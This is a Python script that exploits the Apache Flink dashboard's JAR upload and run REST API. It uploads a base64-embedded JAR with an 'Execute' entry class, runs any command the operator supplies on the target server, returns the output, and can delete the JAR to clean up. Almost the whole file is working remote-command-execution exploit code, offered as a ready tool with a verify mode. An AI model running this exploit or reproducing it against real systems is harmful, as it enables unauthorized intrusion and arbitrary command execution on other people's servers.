#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey

import re
import sys
import time
import json
import base64
import argparse
import traceback
import cStringIO

import requests


def check_jar_exsits(site, upload_jar_name):
    list_jar_url = "{}/jars/".format(site)
    response = requests.get(list_jar_url, headers=default_headers, verify=False, timeout=30, proxies=proxies)
    if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
        try:
            r = json.loads(response.text)
            for upload_file in r['files']:
                if str(upload_file['id']).endswith('{}'.format(upload_jar_name)):
                    return upload_file['id']
        except Exception as e:
            return False
    return False


def upload_execute_jar(site, upload_jar_name):
    upload_jar_url = "{}/jars/upload".format(site)
    file_content = base64.b64decode('UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAAAAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAKVkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLvCGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujCQNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJNaFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Qo0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNMKA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjoRF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqps0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJcVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEsOJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6EjptI4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IOYg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1bU+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQAFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUGAAAAAAMAAwC4AAAArgQAAAAA')
    files = {'jarfile': (upload_jar_name, cStringIO.StringIO(file_content), 'application/octet-stream')}
    try:
        requests.post(upload_jar_url, headers=default_headers, files=files, timeout=30, verify=False, proxies=proxies)
    except Exception as e:
        return False
    return True


def delete_exists_jar(site, jar_hash_name):
    single_jar_url = "{}/jars/{}".format(site, jar_hash_name)
    try:
        response = requests.delete(single_jar_url, headers=default_headers, verify=False, timeout=30, proxies=proxies)
        if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
            return True
    except Exception as e:
        return False
    return False


def verify(site):
    jar_hash_name = check_jar_exsits(site, upload_jar_name)
    if jar_hash_name:
        delete_exists_jar(site, jar_hash_name)
        return True
    else:
        upload_execute_jar(site, upload_jar_name)
        jar_hash_name = check_jar_exsits(site, upload_jar_name)
        delete_exists_jar(site, jar_hash_name)
        if jar_hash_name:
            return True
    return False


def exec_command(site, command):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0 Safari/537.36',
        'Content-Type': 'application/json;charset=utf-8',
    }
    jar_hash_name = check_jar_exsits(site, upload_jar_name)
    data = r'{"entryClass":"Execute","parallelism":null,"programArgs":"\"%s\"","savepointPath":null,"allowNonRestoredState":null}' % command
    if jar_hash_name:
        execute_cmd_url = '{}/jars/{}/run?entry-class=Execute&program-args="{}"'.format(site, jar_hash_name, command)
    else:
        upload_execute_jar(site, upload_jar_name)
        jar_hash_name = check_jar_exsits(site, upload_jar_name)
        if jar_hash_name:
            execute_cmd_url = '{}/jars/{}/run?entry-class=Execute&program-args="{}"'.format(site, jar_hash_name, command)
        else:
            return False
    try:
        r1 = requests.post(execute_cmd_url, headers=headers, data=data, verify=False, timeout=20, proxies=proxies)
        match = re.findall('\|@\|(.*?)\|@\|', r1.text)
        if will_delete_jar:
            delete_exists_jar(site, jar_hash_name)
        if match:
            return match[0][:-2] if match[0][:-2] else "[result is blank]"
    except requests.exceptions.ReadTimeout as e:
        return "[execute timeout]"
    return False


if __name__ == "__main__":
    start = time.time()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest='url', default="http://127.0.0.1:8081", type=str, help='such as: http://127.0.0.1:8081')
    parser.add_argument('-c', dest='command', default='', type=str, help='command that your will execute on target')
    parser.add_argument('--delete', dest='delete', default='', action="store_true", help='delete jar after execute command')
    parser.add_argument('--proxy', dest='proxy', default=None, type=str, help='request http/https proxy')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    url = args.url
    command = args.command
    proxy = args.proxy
    will_delete_jar = args.delete

    target = url.rstrip('/')
    upload_jar_name = 'check-execute.jar'
    proxies = {'http': proxy, 'https': proxy}
    default_headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0 Safari/537.36'}
    if "://" not in target:
        target = "http://" + target
    try:
        if command:
            r = exec_command(target, command)
            if r:
                print("[^_^] [ {} ] execute success, result:\n{}".format(command, r.replace('\\n', '\n')))
            else:
                print("[>_<] [ {} ] is not vulnerable".format(url))
        else:
            r = verify(target)
            if r:
                print("[^_^] [ {} ] is vulnerable, testing upload jar successfully !".format(url))
            else:
                print("[>_<] [ {} ] is not vulnerable".format(url))
    except Exception as e:
        print("[>_<] cannot rce!")
        print("[>_<] Error: \n")
        traceback.print_exc()
